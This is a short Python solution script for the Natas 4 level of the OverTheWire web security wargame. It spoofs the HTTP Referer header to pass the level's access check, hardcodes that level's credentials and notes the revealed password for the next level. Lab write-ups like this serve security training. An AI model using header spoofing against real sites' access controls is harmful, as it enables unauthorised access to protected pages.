#!/usr/bin/env python

#natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ

import requests
import re

referer = {"referer":"http://natas5.natas.labs.overthewire.org/"}

username = 'natas4'
password = 'Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ'

def loginWebSite():
    siteUrl = 'http://{}.natas.labs.overthewire.org'.format(username)
    content = requests.get(siteUrl, auth = (username, password), headers = referer)
    print(content.text)
    #print(re.findall('The password for (.*)', content))

def loginNextchallenge():
    username = 'natas5'
    password = 'iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq'
    siteUrl = 'http://natas5.natas.labs.overthewire.org/'
    content = requests.get(siteUrl, auth = (username, password))
    print(content.text)
    


loginWebSite()                  #Access granted. The password for natas5 is iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq
#loginNextchallenge()